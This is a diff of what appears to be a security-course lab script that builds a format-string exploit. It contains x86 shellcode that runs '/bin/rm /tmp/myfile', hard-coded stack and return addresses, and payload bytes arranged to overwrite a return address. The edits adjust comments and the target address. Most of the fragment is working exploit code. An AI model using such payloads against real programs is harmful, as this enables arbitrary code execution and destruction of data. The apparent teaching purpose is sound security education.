@@ -19,7 +19,6 @@ malicious_code = (
 
     # Push the 2nd argument into the stack:
     #       '/bin/rm /tmp/myfile'
-    # Students need to use their own VM's IP address
     "\x31\xd2"                      # xorl %edx,%edx
     "\x52"                          # pushl %edx
     "\x68""    "                    # pushl (an integer) --> 1
@@ -60,7 +59,7 @@ content[start:] = malicious_code
 
 # The address of the input array: 0xffffd0f0
 # The ebp value inside myprintf() is: 0xffffd0a8
-# Return address is 4 bytes above frame pointer
+# Return address is 4 bytes above frame pointer => 0xffffd0ac
 
 return_address = 0xffffd0ac
 input_array_address = 0xffffd0f0
@@ -75,7 +74,7 @@ content[0:4] = last_two_bytes.to_bytes(4, byteorder='little')
 content[4:8] = b"@@@@"
 content[8:12] = first_two_bytes.to_bytes(4, byteorder='little')
 
-# To write: 0xffffd4d8
+# To write: 0xffffd2e4
 
 small = 0xffff - 12 - 240
 large = (0x10000 - 0xffff - 1) + 0xd2e4
